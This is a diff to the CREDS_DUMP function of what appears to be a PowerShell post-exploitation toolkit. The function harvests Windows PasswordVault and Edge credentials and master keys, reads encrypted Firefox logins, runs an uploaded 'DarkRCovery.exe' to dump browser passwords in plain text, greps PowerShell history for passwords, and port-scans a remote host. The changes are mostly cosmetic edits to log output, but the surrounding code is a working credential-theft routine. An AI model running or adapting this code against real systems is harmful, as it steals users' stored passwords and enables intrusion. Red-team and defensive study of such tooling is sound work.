@@ -823,7 +823,7 @@ function ADDONS {
 
 function CREDS_DUMP {
     ## Retrieve IE Credentials
-    echo "`n`n[ IE ]" >> $LogFilePath\BrowserEnum.log
+    echo "`n`n[ IE|MSEDGE ]" >> $LogFilePath\BrowserEnum.log
     ## Retrieve Credentials from PasswordVault
     # https://github.com/HanseSecure/credgrap_ie_edge/blob/master/credgrap_ie_edge.ps1
     [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
@@ -844,10 +844,15 @@ function CREDS_DUMP {
             $SplitString = $DelSpaces -split('468')
             $RegexSearch = $SplitString|Select-String -pattern '[a-zA-Z]'
             $RawMasterKeys = $RegexSearch -replace ' ',''
+
             ## Build table to display results
             echo "`nMaster keys" >> $LogFilePath\BrowserEnum.log
             echo "-----------" >> $LogFilePath\BrowserEnum.log
-            echo $RawMasterKeys >> $LogFilePath\BrowserEnum.log
+            If(-not($RawMasterKeys) -or $RawMasterKeys -eq $null){
+                echo "None master keys found" >> $LogFilePath\BrowserEnum.log
+            }else{
+                echo $RawMasterKeys >> $LogFilePath\BrowserEnum.log
+            }
         }else{
             echo "None master keys found" >> $LogFilePath\BrowserEnum.log
         }
@@ -858,18 +863,20 @@ function CREDS_DUMP {
 
     ## Retrieve FireFox Credentials
     echo "`n`n[ Firefox ]" >> $LogFilePath\BrowserEnum.log
-    echo "-----------" >> $LogFilePath\BrowserEnum.log
+    echo "------------------------------------------------" >> $LogFilePath\BrowserEnum.log
     If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json")){
         $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" # (IEFP)
         If(-not(Test-Path "$Bookmarks_Path")){
             echo "None Credentials found" >> $LogFilePath\BrowserEnum.log
         }else{
+            echo "Extracting => encrypted creds" >> $LogFilePath\BrowserEnum.log
             $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" # (IEFP)
             $Json = Get-Content "$Bookmarks_Path"|ConvertFrom-Json|select *
             $Json.logins|select-object hostname,encryptedUsername >> $LogFilePath\BrowserEnum.log
             $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
         }  
     }else{
+        echo "Extracting => encrypted creds" >> $LogFilePath\BrowserEnum.log
         $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json"
         $Json = Get-Content "$Bookmarks_Path"|ConvertFrom-Json|select *
         $Json.logins|select-object hostname,encryptedUsername >> $LogFilePath\BrowserEnum.log
@@ -878,8 +885,8 @@ function CREDS_DUMP {
 
     ## Leak Firefox|Chrome credentials to plain text { EXE Coded By 0xyg3n }
     # DarkRCovery requires to be uploaded to $env:TMP { Client working dir }
-    echo "`n`n[ Leak credentials - By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
-    echo "--------------------------------" >> $LogFilePath\BrowserEnum.log
+    echo "`n`n[ Leak credentials => By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
+    echo "---------------------------------" >> $LogFilePath\BrowserEnum.log
     If(Test-Path "$env:TMP\DarkRCovery.exe"){
     cd $env:TMP;Start-Process "$env:TMP\DarkRCovery.exe" -Wait # Wait for DarkRCovery.exe to finish ..
         If(Test-Path "$env:TMP\Leaked.txt"){
@@ -899,7 +906,7 @@ function CREDS_DUMP {
             echo $RawCredentials >> $LogFilePath\BrowserEnum.log
             cd $IPATH
         }else{
-            echo "[ Not found: `$env:TMP\Leaked.txt ]" >> $LogFilePath\BrowserEnum.log
+            echo "Not found => `$env:TMP\Leaked.txt" >> $LogFilePath\BrowserEnum.log
             cd $IPATH
         }
     }else{
@@ -912,7 +919,7 @@ function CREDS_DUMP {
     If(-not(Test-Path "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt")){
         echo "`n`n[ Creds in ConsoleHost_history.txt ]" >> $LogFilePath\BrowserEnum.log
         echo "------------------------------------" >> $LogFilePath\BrowserEnum.log
-        echo "ConsoleHost_history.txt => not found" >> $LogFilePath\BrowserEnum.log
+        echo "Not found => ConsoleHost_history.txt" >> $LogFilePath\BrowserEnum.log
     }else{
         $Path = "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
         $Credentials = Get-Content "$Path"|Select-String -pattern "passw","user","login","email"
@@ -942,13 +949,13 @@ function CREDS_DUMP {
     echo "-----------   ------   -----  ----" >> $LogFilePath\BrowserEnum.log
     $PortRange -split(',')|Foreach-Object -Process {
         If((Test-NetConnection $Remote_Host -Port $_ -WarningAction SilentlyContinue).tcpTestSucceeded -eq $true){
-            echo "$Remote_Host  Open     tcp    $_" >> $LogFilePath\BrowserEnum.log
+            echo "$Remote_Host  Open     tcp    $_ *" >> $LogFilePath\BrowserEnum.log
             $counter++
         }else{
             echo "$Remote_Host  Closed   tcp    $_" >> $LogFilePath\BrowserEnum.log
         }
     }
-    echo "`nTotal open tcp ports found: $counter" >> $LogFilePath\BrowserEnum.log
+    echo "`nTotal open tcp ports found => $counter" >> $LogFilePath\BrowserEnum.log
 }
 
 
